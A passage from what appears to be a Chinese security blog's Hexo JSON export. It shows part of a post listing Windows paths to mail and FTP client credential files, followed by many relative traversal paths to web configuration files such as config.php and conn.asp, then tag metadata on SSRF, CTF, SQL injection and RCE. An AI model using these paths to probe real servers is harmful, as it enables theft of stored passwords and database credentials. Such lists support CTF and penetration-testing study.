Files\\Foxmal\\accounts.cfg\nC:\\Program Files\\tencent\\Foxmal\\Foxmail.exe\nC:\\Program Files\\tencent\\Foxmal\\accounts.cfg\nC:\\Program Files\\LeapFTP 3.0\\LeapFTP.exe\nC:\\Program Files\\LeapFTP\\LeapFTP.exe\nc:\\Program Files\\GlobalSCAPE\\CuteFTP Pro\\cftppro.exe\nc:\\Program Files\\GlobalSCAPE\\CuteFTP Pro\\notes.txt\nC:\\Program Files\\FlashFXP\\FlashFXP.ini\nC:\\Program Files\\FlashFXP\\flashfxp.exe\nc:\\Program Files\\Oracle\\bin\\regsvr32.exe\nc:\\Program Files\\腾讯游戏\\QQGAME\\readme.txt\nc:\\Program Files\\tencent\\腾讯游戏\\QQGAME\\readme.txt\nc:\\Program Files\\tencent\\QQGAME\\readme.txt\nC:\\Program Files\\StormII\\Storm.exe</code></pre><p>3.网站相对路径:</p>\n<pre><code>/config.php\n../../config.php\n../config.php\n../../../config.php\n/config.inc.php\n./config.inc.php\n../../config.inc.php\n../config.inc.php\n../../../config.inc.php\n/conn.php\n./conn.php\n../../conn.php\n../conn.php\n../../../conn.php\n/conn.asp\n./conn.asp\n../../conn.asp\n../conn.asp\n../../../conn.asp\n/config.inc.php\n./config.inc.php\n../../config.inc.php\n../config.inc.php\n../../../config.inc.php\n/config/config.php\n../../config/config.php\n../config/config.php\n../../../config/config.php\n/config/config.inc.php\n./config/config.inc.php\n../../config/config.inc.php\n../config/config.inc.php\n../../../config/config.inc.php\n/config/conn.php\n./config/conn.php\n../../config/conn.php\n../config/conn.php\n../../../config/conn.php\n/config/conn.asp\n./config/conn.asp\n../../config/conn.asp\n../config/conn.asp\n../../../config/conn.asp\n/config/config.inc.php\n./config/config.inc.php\n../../config/config.inc.php\n../config/config.inc.php\n../../../config/config.inc.php\n/data/config.php\n../../data/config.php\n../data/config.php\n../../../data/config.php\n/data/config.inc.php\n./data/config.inc.php\n../../data/config.inc.php\n../data/config.inc.php\n../../../data/config.inc.php\n/data/conn.php\n./data/conn.php\n../../data/conn.php\n../data/conn.php\n../../../data/conn.php\n/data/conn.asp\n./data/conn.asp\n../../data/conn.asp\n../data/conn.asp\n../../../data/conn.asp\n/data/config.inc.php\n./data/config.inc.php\n../../data/config.inc.php\n../data/config.inc.php\n../../../data/config.inc.php\n/include/config.php\n../../include/config.php\n../include/config.php\n../../../include/config.php\n/include/config.inc.php\n./include/config.inc.php\n../../include/config.inc.php\n../include/config.inc.php\n../../../include/config.inc.php\n/include/conn.php\n./include/conn.php\n../../include/conn.php\n../include/conn.php\n../../../include/conn.php\n/include/conn.asp\n./include/conn.asp\n../../include/conn.asp\n../include/conn.asp\n../../../include/conn.asp\n/include/config.inc.php\n./include/config.inc.php\n../../include/config.inc.php\n../include/config.inc.php\n../../../include/config.inc.php\n/inc/config.php\n../../inc/config.php\n../inc/config.php\n../../../inc/config.php\n/inc/config.inc.php\n./inc/config.inc.php\n../../inc/config.inc.php\n../inc/config.inc.php\n../../../inc/config.inc.php\n/inc/conn.php\n./inc/conn.php\n../../inc/conn.php\n../inc/conn.php\n../../../inc/conn.php\n/inc/conn.asp\n./inc/conn.asp\n../../inc/conn.asp\n../inc/conn.asp\n../../../inc/conn.asp\n/inc/config.inc.php\n./inc/config.inc.php\n../../inc/config.inc.php\n../inc/config.inc.php\n../../../inc/config.inc.php\n/index.php\n./index.php\n../../index.php\n../index.php\n../../../index.php\n/index.asp\n./index.asp\n../../index.asp\n../index.asp\n../../../index.asp</code></pre>"}],"PostAsset":[],"PostCategory":[{"post_id":"cktfnuyd30001t8opgbqo77ge","category_id":"cktfnuydc0005t8op1j3tc5j1","_id":"cktfnuydm000ht8op7boae3wm"},{"post_id":"cktfnuydg0009t8opdzrvcvwv","category_id":"cktfnuydq000mt8ophanz6ahm","_id":"cktfnuydx000xt8opczu3byag"},{"post_id":"cktfnuydj000ft8op58fgbo7z","category_id":"cktfnuydx000wt8op796k4apj","_id":"cktfnuye20018t8op3n665q6j"},{"post_id":"cktfnuye00015t8opaase9pl3","category_id":"cktfnuydi000ct8op0xibgx9l","_id":"cktfnuye7001et8opc3xi9u5f"},{"post_id":"cktfnuyd90003t8opga64ejya","category_id":"cktfnuydi000ct8op0xibgx9l","_id":"cktfnuye8001ht8op85n7a3zo"},{"post_id":"cktfnuyd90003t8opga64ejya","category_id":"cktfnuye00013t8op9gni3d1u","_id":"cktfnuye9001mt8op0ulxhx36"},{"post_id":"cktfnuye6001dt8op2mln1uan","category_id":"cktfnuydc0005t8op1j3tc5j1","_id":"cktfnuyea001pt8op4mfi4aww"},{"post_id":"cktfnuydl000gt8op6pv0a18x","category_id":"cktfnuye3001at8op4f1cfx8b","_id":"cktfnuyec001ut8op0jrebkjd"},{"post_id":"cktfnuye7001gt8op32lv4s82","category_id":"cktfnuydi000ct8op0xibgx9l","_id":"cktfnuyee001xt8opg8fic6y5"},{"post_id":"cktfnuye9001lt8op4mqt87uh","category_id":"cktfnuydc0005t8op1j3tc5j1","_id":"cktfnuyeh0022t8op1syue2ae"},{"post_id":"cktfnuydo000kt8op0pu294ih","category_id":"cktfnuye8001jt8op61hbh3qe","_id":"cktfnuyei0025t8opdjrnbwr8"},{"post_id":"cktfnuyea001ot8op315z4zls","category_id":"cktfnuydi000ct8op0xibgx9l","_id":"cktfnuyeo002at8opb54qhcep"},{"post_id":"cktfnuyde0007t8op9fzzehoh","category_id":"cktfnuydi000ct8op0xibgx9l","_id":"cktfnuyeq002dt8op076vhxjk"},{"post_id":"cktfnuyde0007t8op9fzzehoh","category_id":"cktfnuye00013t8op9gni3d1u","_id":"cktfnuyes002it8opd5bp8rjw"},{"post_id":"cktfnuyed001wt8op7nvw1il8","category_id":"cktfnuydc0005t8op1j3tc5j1","_id":"cktfnuyet002kt8op0wdj4i6p"},{"post_id":"cktfnuydp000lt8opawxfbexf","category_id":"cktfnuye3001at8op4f1cfx8b","_id":"cktfnuyeu002ot8op9zxnhcod"},{"post_id":"cktfnuyds000ot8opdpnz4glv","category_id":"cktfnuyej0027t8op7zsq2nu0","_id":"cktfnuyev002qt8opcd8yaitb"},{"post_id":"cktfnuyer002ht8opdm0h6p95","category_id":"cktfnuydx000wt8op796k4apj","_id":"cktfnuyew002tt8op7bnlfz59"},{"post_id":"cktfnuydt000qt8op2i7x7r9q","category_id":"cktfnuyeq002ft8op26v371sf","_id":"cktfnuyew002vt8op2mkv2kxo"},{"post_id":"cktfnuydv000ut8op6ka229ra","category_id":"cktfnuyeq002ft8op26v371sf","_id":"cktfnuyew002xt8op0ccbbxef"},{"post_id":"cktfnuydh000bt8op9pxncvqj","category_id":"cktfnuydi000ct8op0xibgx9l","_id":"cktfnuyex0031t8opco2t4u7q"},{"post_id":"cktfnuydh000bt8op9pxncvqj","category_id":"cktfnuye00013t8op9gni3d1u","_id":"cktfnuyey0034t8opacmc5iug"},{"post_id":"cktfnuydw000vt8opa7lj7toy","category_id":"cktfnuyej0027t8op7zsq2nu0","_id":"cktfnuyey0036t8op02xg48op"},{"post_id":"cktfnuydy000zt8opb97hgtwp","category_id":"cktfnuyeq002ft8op26v371sf","_id":"cktfnuyez003at8opcyoq4l1m"},{"post_id":"cktfnuydz0011t8opco0ie6et","category_id":"cktfnuyeq002ft8op26v371sf","_id":"cktfnuyf0003et8op9pwlcekf"},{"post_id":"cktfnuye10016t8op7prb9449","category_id":"cktfnuyej0027t8op7zsq2nu0","_id":"cktfnuyf1003ht8op1g5zeykk"},{"post_id":"cktfnuyec001tt8op5t9b3pww","category_id":"cktfnuyej0027t8op7zsq2nu0","_id":"cktfnuyf4003pt8opatizaxxz"},{"post_id":"cktfnuyef0021t8op7j7h13mv","category_id":"cktfnuyf3003lt8op2r56h1g9","_id":"cktfnuyf5003ut8oph98wamkh"},{"post_id":"cktfnuyeh0024t8ophfwb6efb","category_id":"cktfnuyf3003lt8op2r56h1g9","_id":"cktfnuyf6003xt8opge5shg9k"},{"post_id":"cktfnuyek0029t8opa9xi3rju","category_id":"cktfnuyf5003tt8op86spf9x1","_id":"cktfnuyf70041t8opakpf7vz9"},{"post_id":"cktfnuyeo002ct8opf2yd0ndh","category_id":"cktfnuydx000wt8op796k4apj","_id":"cktfnuyf80045t8opbwp192lk"},{"post_id":"cktfnuyeo002ct8opf2yd0ndh","category_id":"cktfnuyf6003zt8opcdwt614n","_id":"cktfnuyf80047t8opfmm92rez"},{"post_id":"cktfnuye20019t8op45ff9mn7","category_id":"cktfnuyf0003dt8opgqb18sd1","_id":"cktfnuyf80049t8op3899f3qk"},{"post_id":"cktfnuye20019t8op45ff9mn7","category_id":"cktfnuyf70043t8op1z8w2vlp","_id":"cktfnuyf9004at8op2qx709pv"}],"PostTag":[{"post_id":"cktfnuyd30001t8opgbqo77ge","tag_id":"cktfnuydd0006t8opf3u53e5x","_id":"cktfnuydj000et8op5oke2hc6"},{"post_id":"cktfnuyd90003t8opga64ejya","tag_id":"cktfnuydi000dt8opc7q2h7k4","_id":"cktfnuydt000pt8ophhi65jwr"},{"post_id":"cktfnuyd90003t8opga64ejya","tag_id":"cktfnuydn000jt8op4glnfyh0","_id":"cktfnuydu000rt8op211za3vc"},{"post_id":"cktfnuyde0007t8op9fzzehoh","tag_id":"cktfnuydi000dt8opc7q2h7k4","_id":"cktfnuydy0010t8op9vr90lb7"},{"post_id":"cktfnuyde0007t8op9fzzehoh","tag_id":"cktfnuydn000jt8op4glnfyh0","_id":"cktfnuydz0012t8opftng7004"},{"post_id":"cktfnuye00015t8opaase9pl3","tag_id":"cktfnuydi000dt8opc7q2h7k4","_id":"cktfnuye20017t8op3fsgbhny"},{"post_id":"cktfnuydg0009t8opdzrvcvwv","tag_id":"cktfnuydx000yt8opfkfedbk2","_id":"cktfnuye6001ct8opgvo80ukx"},{"post_id":"cktfnuydg0009t8opdzrvcvwv","tag_id":"cktfnuye00014t8op9tuc6iug","_id":"cktfnuye7001ft8opfjshagco"},{"post_id":"cktfnuye6001dt8op2mln1uan","tag_id":"cktfnuydd0006t8opf3u53e5x","_id":"cktfnuye9001kt8opecathyae"},{"post_id":"cktfnuye7001gt8op32lv4s82","tag_id":"cktfnuydi000dt8opc7q2h7k4","_id":"cktfnuyea001nt8opd98z4sb6"},{"post_id":"cktfnuye9001lt8op4mqt87uh","tag_id":"cktfnuydd0006t8opf3u53e5x","_id":"cktfnuyec001st8op9zgl5xoo"},{"post_id":"cktfnuydh000bt8op9pxncvqj","tag_id":"cktfnuydi000dt8opc7q2h7k4","_id":"cktfnuyed001vt8op9tvd29p4"},{"post_id":"cktfnuydh000bt8op9pxncvqj","tag_id":"cktfnuydn000jt8op4glnfyh0","_id":"cktfnuyef0020t8op7blob7x9"},{"post_id":"cktfnuyea001ot8op315z4zls","tag_id":"cktfnuydi000dt8opc7q2h7k4","_id":"cktfnuyeh0023t8opcfj4fe3q"},{"post_id":"cktfnuydj000ft8op58fgbo7z","tag_id":"cktfnuydn000jt8op4glnfyh0","_id":"cktfnuyej0028t8opacku5hv0"},{"post_id":"cktfnuyed001wt8op7nvw1il8","tag_id":"cktfnuydd0006t8opf3u53e5x","_id":"cktfnuyeo002bt8ope7sbc576"},{"post_id":"cktfnuydl000gt8op6pv0a18x","tag_id":"cktfnuyee001yt8op5jlo3bwy","_id":"cktfnuyer002gt8op0qg39pk1"},{"post_id":"cktfnuydo000kt8op0pu294ih","tag_id":"cktfnuyei0026t8op9gw28slw","_id":"cktfnuyet002jt8opaj2ncjkw"},{"post_id":"cktfnuyer002ht8opdm0h6p95","tag_id":"cktfnuydn000jt8op4glnfyh0","_id":"cktfnuyeu002mt8op6tmegh8n"},{"post_id":"cktfnuydp000lt8opawxfbexf","tag_id":"cktfnuyee001yt8op5jlo3bwy","_id":"cktfnuyev002pt8opfjdzhght"},{"post_id":"cktfnuyds000ot8opdpnz4glv","tag_id":"cktfnuyet002lt8op649earf2","_id":"cktfnuyew002ut8ope1h86bgg"},{"post_id":"cktfnuydt000qt8op2i7x7r9q","tag_id":"cktfnuyev002rt8op8ntn8ng9","_id":"cktfnuyex002zt8opa4h4h5g9"},{"post_id":"cktfnuydv000ut8op6ka229ra","tag_id":"cktfnuyev002rt8op8ntn8ng9","_id":"cktfnuyey0033t8opd37ce0n9"},{"post_id":"cktfnuydw000vt8opa7lj7toy","tag_id":"cktfnuyet002lt8op649earf2","_id":"cktfnuyez0038t8op6s901e40"},{"post_id":"cktfnuydy000zt8opb97hgtwp","tag_id":"cktfnuyev002rt8op8ntn8ng9","_id":"cktfnuyf0003ct8op59huao8m"},{"post_id":"cktfnuydz0011t8opco0ie6et","tag_id":"cktfnuyev002rt8op8ntn8ng9","_id":"cktfnuyf1003gt8op0uv3fnwm"},{"post_id":"cktfnuye10016t8op7prb9449","tag_id":"cktfnuyet002lt8op649earf2","_id":"cktfnuyf3003kt8op17tm4ej9"},{"post_id":"cktfnuye20019t8op45ff9mn7","tag_id":"cktfnuyf1003it8opbslqcz1z","_id":"cktfnuyf4003nt8op5ans2nfq"},{"post_id":"cktfnuye20019t8op45ff9mn7","tag_id":"cktfnuydi000dt8opc7q2h7k4","_id":"cktfnuyf4003ot8opeuh8dlwr"},{"post_id":"cktfnuyec001tt8op5t9b3pww","tag_id":"cktfnuyet002lt8op649earf2","_id":"cktfnuyf5003st8op0jb1fe4u"},{"post_id":"cktfnuyef0021t8op7j7h13mv","tag_id":"cktfnuyf4003qt8opa28h9jlu","_id":"cktfnuyf6003wt8op1a8zhy4l"},{"post_id":"cktfnuyeh0024t8ophfwb6efb","tag_id":"cktfnuyf4003qt8opa28h9jlu","_id":"cktfnuyf70040t8op68um2wsr"},{"post_id":"cktfnuyek0029t8opa9xi3rju","tag_id":"cktfnuyf6003yt8opennrhi9s","_id":"cktfnuyf70044t8opbc5we063"},{"post_id":"cktfnuyeo002ct8opf2yd0ndh","tag_id":"cktfnuydn000jt8op4glnfyh0","_id":"cktfnuyf80046t8op6asy60bz"},{"post_id":"cktfnuyeo002ct8opf2yd0ndh","tag_id":"cktfnuyf70042t8op3kordf1w","_id":"cktfnuyf80048t8op1yulbf3x"}],"Tag":[{"name":"PHP","_id":"cktfnuydd0006t8opf3u53e5x"},{"name":"SSRF","_id":"cktfnuydi000dt8opc7q2h7k4"},{"name":"CTF","_id":"cktfnuydn000jt8op4glnfyh0"},{"name":"LD_PRELOA","_id":"cktfnuydx000yt8opfkfedbk2"},{"name":"Bypass_disable_function","_id":"cktfnuye00014t8op9tuc6iug"},{"name":"Git","_id":"cktfnuyee001yt8op5jlo3bwy"},{"name":"计算机网络","_id":"cktfnuyei0026t8op9gw28slw"},{"name":"SQL注入","_id":"cktfnuyet002lt8op649earf2"},{"name":"RCE","_id":"cktfnuyev002rt8op8ntn8ng9"},{"name":"FastCGI","_id":"cktfnuyf1003it8opbslqcz1z"},{"name":"文件包含","_id":"cktfnuyf4003qt8opa28h9jlu"},{"name":"文件上传","_id":"cktfnuyf6003yt8opennrhi9s"},{"name":"源码泄露","_id":"cktfnuyf70042t8op3kordf1w"}]}}